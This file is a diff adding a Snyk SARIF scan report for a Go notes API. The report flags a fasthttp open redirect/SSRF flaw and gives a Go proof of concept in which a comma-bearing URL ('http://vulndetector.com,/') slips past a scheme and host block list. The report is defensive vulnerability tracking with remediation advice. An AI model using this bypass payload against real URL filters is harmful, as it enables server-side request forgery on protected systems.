@@ -1,0 +1,69 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Snyk Open Source",
+          "semanticVersion": "1.1296.1",
+          "version": "1.1296.1",
+          "informationUri": "https://docs.snyk.io/",
+          "properties": {
+            "artifactsScanned": 64
+          },
+          "rules": [
+            {
+              "id": "SNYK-GOLANG-GITHUBCOMVALYALAFASTHTTP-6815320",
+              "shortDescription": {
+                "text": "Medium severity - Open Redirect vulnerability in github.com/valyala/fasthttp"
+              },
+              "fullDescription": {
+                "text": "github.com/valyala/fasthttp@1.51.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: gomodules\n* Vulnerable module: github.com/valyala/fasthttp\n* Introduced through: github.com/AstreaRider/notes-api-demo@0.0.0, github.com/gofiber/fiber/v2/middleware/logger@2.52.5 and others\n### Detailed paths\n* _Introduced through_: github.com/AstreaRider/notes-api-demo@0.0.0 › github.com/gofiber/fiber/v2/middleware/logger@2.52.5 › github.com/valyala/fasthttp@1.51.0\n* _Introduced through_: github.com/AstreaRider/notes-api-demo@0.0.0 › github.com/gofiber/fiber/v2@2.52.5 › github.com/valyala/fasthttp@1.51.0\n* _Introduced through_: github.com/AstreaRider/notes-api-demo@0.0.0 › github.com/gofiber/fiber/v2@2.52.5 › github.com/valyala/fasthttp@1.51.0\n* _Introduced through_: github.com/AstreaRider/notes-api-demo@0.0.0 › github.com/gofiber/fiber/v2/middleware/logger@2.52.5 › github.com/gofiber/fiber/v2@2.52.5 › github.com/valyala/fasthttp@1.51.0\n* _Introduced through_: github.com/AstreaRider/notes-api-demo@0.0.0 › github.com/gofiber/fiber/v2/middleware/logger@2.52.5 › github.com/gofiber/fiber/v2@2.52.5 › github.com/valyala/fasthttp@1.51.0\n# Overview\n[github.com/valyala/fasthttp](https://pkg.go.dev/github.com/valyala/fasthttp) is a fast HTTP server and client API.\n\nAffected versions of this package are vulnerable to Open Redirect due to improper handling of malformed URLs, allowing attackers to bypass the protections that users have set up for schemes and hosts. An attacker can send a URL involving a `,` to the Validator (e.g., `http://vulndetector.com,/`), bypassing the URL blocklist validation, and keep sending requests to the domain with a blocklisted hostname, leading to SSRF and RCE attacks.\n# PoC\n```\r\npackage main\r\n\r\nimport (\r\n\t\"fmt\"\r\n\t\"github.com/valyala/fasthttp\"\r\n\t\"net/url\"\r\n\t\"strings\"\r\n)\r\n\r\nfunc safeURLOpener(inputLink string) (*fasthttp.Response, error) {\r\n\tblockSchemes := map[string]bool{\r\n\t\t\"file\": true, \"gopher\": true, \"expect\": true,\r\n\t\t\"php\": true, \"dict\": true, \"ftp\": true,\r\n\t\t\"glob\": true, \"data\": true,\r\n\t}\r\n\tblockHost := map[string]bool{\r\n\t\t\"vulndetector.com\": true,\r\n\t}\r\n\r\n\tparsedUrl, err := url.Parse(inputLink)\r\n\tif err != nil {\r\n\t\tfmt.Println(\"Error parsing URL:\", err)\r\n\t\treturn nil, err\r\n\t}\r\n\r\n\tinputScheme := parsedUrl.Scheme\r\n\tinputHostname := parsedUrl.Hostname()\r\n\r\n\tif blockSchemes[inputScheme] {\r\n\t\tfmt.Println(\"input scheme is forbidden\")\r\n\t\treturn nil, nil\r\n\t}\r\n\r\n\tif blockHost[inputHostname] {\r\n\t\tfmt.Println(\"input hostname is forbidden\")\r\n\t\treturn nil, nil\r\n\t}\r\n\r\n\t// Create request and response objects\r\n\treq := fasthttp.AcquireRequest()\r\n\tresp := fasthttp.AcquireResponse()\r\n\tdefer fasthttp.ReleaseRequest(req)   // to reuse requests\r\n\tdefer fasthttp.ReleaseResponse(resp) // to reuse responses\r\n\r\n\treq.SetRequestURI(inputLink)\r\n\terr = fasthttp.Do(req, resp)\r\n\tif err != nil {\r\n\t\tfmt.Println(\"HTTP request failed:\", err)\r\n\t\treturn nil, err\r\n\t}\r\n\r\n\t// Since we need the body outside this function, we create a copy of the response\r\n\tnewResp := &fasthttp.Response{}\r\n\tresp.CopyTo(newResp)\r\n\treturn newResp, nil\r\n}\r\n\r\nfunc verify() {\r\n\tpayload := \"http://vulndetector.com,/\"\r\n\tresult, err := safeURLOpener(payload)\r\n\tif err != nil {\r\n\t\tfmt.Println(\"Failed to open URL:\", err)\r\n\t\treturn\r\n\t}\r\n\tif result != nil {\r\n\t\tbodyBytes := result.Body()\r\n\t\tbodyString := string(bodyBytes)\r\n\t\tif result.StatusCode() == 200 && strings.Contains(bodyString, \"FindVuln\") {\r\n\t\t\tfmt.Println(\"payload find! ==>\", payload)\r\n\t\t}\r\n\t}\r\n}\r\n\r\nfunc main() {\r\n\tverify()\r\n}\r\n```\n# Remediation\nUpgrade `github.com/valyala/fasthttp` to version 1.53.0 or higher.\n# References\n- [GitHub Commit](https://github.com/valyala/fasthttp/commit/a8fa9c04b493324b7805dd5c6f8439b1b15a9f92)\n- [GitHub PR](https://github.com/valyala/fasthttp/pull/1761#issuecomment-2100784469)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-601",
+                  "gomodules"
+                ],
+                "cvssv3_baseScore": 5.4,
+                "security-severity": "5.4"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "SNYK-GOLANG-GITHUBCOMVALYALAFASTHTTP-6815320",
+          "level": "warning",
+          "message": {
+            "text": "This file introduces a vulnerable github.com/valyala/fasthttp package with a medium severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "go.mod"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "github.com/valyala/fasthttp@1.51.0"
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
